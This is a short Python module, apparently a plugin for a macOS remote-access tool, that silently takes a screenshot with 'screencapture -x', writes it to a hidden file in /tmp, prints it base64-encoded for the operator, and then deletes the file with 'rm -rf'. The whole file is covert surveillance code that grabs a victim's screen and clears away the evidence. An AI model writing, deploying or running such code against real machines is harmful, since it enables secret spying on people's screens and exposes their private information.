# -*- coding: utf-8 -*-
__author__ = "Marten4n6"
__license__ = "GPLv3"

import subprocess

OUTPUT_FILE = "/tmp/.please_not_porn.png"


def run_command(command):
    out, err = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()
    return out + err


def run(options):
    run_command("screencapture -x " + OUTPUT_FILE)
    print(run_command("base64 " + OUTPUT_FILE))
    run_command("rm -rf " + OUTPUT_FILE)
